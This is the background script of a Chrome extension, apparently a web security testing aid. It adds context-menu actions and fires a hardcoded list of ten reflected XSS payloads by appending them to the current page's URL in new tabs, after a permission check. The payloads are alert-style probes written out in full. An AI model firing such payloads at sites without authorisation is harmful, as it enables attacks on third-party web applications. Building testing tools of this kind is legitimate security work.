chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: "reflected-xss",
    title: "Run reflected XSS payloads",
  });
});

chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: "evaluate-url",
    title: "Evaluate url",
  });
});

chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: "create-custom-request",
    title: "Create custom request",
  });
});

chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: "map-inputs",
    title: "Map out all inputs",
  });
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === "map-inputs") {
    chrome.tabs.sendMessage(tab.id, {
      action: "map out all inputs",
    });
  }
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === "create-custom-request") {
    chrome.tabs.sendMessage(tab.id, {
      action: "Create custom request",
    });
  }
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === "evaluate-url") {
    chrome.tabs.sendMessage(tab.id, {
      action: "evaluate current url",
    });
  }
});

function runPayloads(url, payloadsToRun) {
  let payloads = [
    `<script>alert('XSS1')</script>`,
    `"><script>alert('XSS2')</script>`,
    `'><img src=x onerror=alert('XSS3')>`,
    `"><svg/onload=alert('XSS4')>`,
    `<svg><animate onbegin=alert('XSS5') attributeName=href dur=0.1s></animate></svg>`,
    `"><a href="javascript:alert('XSS6')">click</a>`,
    `%3Cscript%3Ealert('XSS7')%3C%2Fscript%3E`,
    `<svg/onload=confirm('XSS8')>`,
    `"><input autofocus onfocus=alert('XSS9')>`,
    `<body onload=alert('XSS10')>`,
  ];

  let payloadsRan = 0;

  payloads.forEach((payload) => {
    if (payloadsRan < payloadsToRun) {
      let urlWithPayload = url + payload;
      setTimeout(() => chrome.tabs.create({ url: urlWithPayload }), 1000);
      payloadsRan++;
    }
  });
}

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === "reflected-xss") {
    chrome.tabs.sendMessage(
      tab.id,
      {
        action: "confirmUserHasPermission",
        data: "does user have permission",
      },
      function (response) {
        if (response && response.hasPermission === true) {
          runPayloads(tab.url, response.payloadsToRun);
        }
      }
    );
  }
});
